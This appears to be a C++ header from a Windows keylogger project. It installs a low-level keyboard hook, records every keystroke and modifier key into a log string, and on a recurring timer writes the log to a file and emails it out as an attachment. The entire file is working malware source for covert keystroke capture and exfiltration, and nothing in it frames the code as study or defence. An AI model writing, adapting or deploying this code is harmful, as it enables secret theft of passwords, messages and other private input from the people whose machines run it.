#ifndef KEYHOOK_H_INCLUDED
#define KEYHOOK_H_INCLUDED

#include <iostream>
#include <fstream>
#include "../../x86_64-w64-mingw32/include/windows.h"
#include "timer.h"
#include "sendmail.h"
#include "Keys.h"

std::string keylog;

void TimerSendMail() {
    if (keylog.empty()) {
        return;
    }

    //if keylogger is not empty, write it to a file
    std::string last_file = IO::WriteLog(keylog);

    if (last_file.empty()) {
        Helper::WriteAppLog("File Creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi :)\nThe File has been attached\n"
                           "Testing, enjoy\n" + keylog,
                           IO::GetOurPath(true) + last_file);
    //checking if mail was sent
    if (x != 7) {
        Helper::WriteAppLog("Mail was not sent. error code: " + Helper::ToString(x));
    } else {   //clearing keystroke log
        keylog = "";
    }

}

Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = nullptr;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
    if (nCode < 0) {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }
    auto *kbs = (KBDLLHOOKSTRUCT *) lparam;

    //if a key is pressed
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
        //append the pressed keys to the keylog string
        keylog += Keys::KEYS[kbs->vkCode].Name;

        //if enter is logged, actually include a newline in keylog
        if (kbs->vkCode == VK_RETURN) {
            keylog += '\n';

        }
    }
        //keeping track if the system keys are up
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL
            || key == VK_LCONTROL
            || key == VK_RCONTROL
            || key == VK_SHIFT
            || key == VK_RSHIFT
            || key == VK_LSHIFT
            || key == VK_MENU
            || key == VK_LMENU
            || key == VK_RMENU
            || key == VK_CAPITAL
            || key == VK_NUMLOCK
            || key == VK_LWIN
            || key == VK_RWIN
                ) {
            //adds which system keys were pressed and inserts
            //a "/" if it was let go to signify when it was let go
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook() {
    Helper::WriteAppLog("Hook Started... timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc,
                             GetModuleHandle(nullptr), 0);
    //if eHook == Null return true, else return false
    return eHook == nullptr;
}

bool UninstallHook() {
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = nullptr;
    return (bool) b;
}

bool IsHooked() {
    return (bool) (eHook == nullptr);
}

#endif // KEYHOOK_H_INCLUDED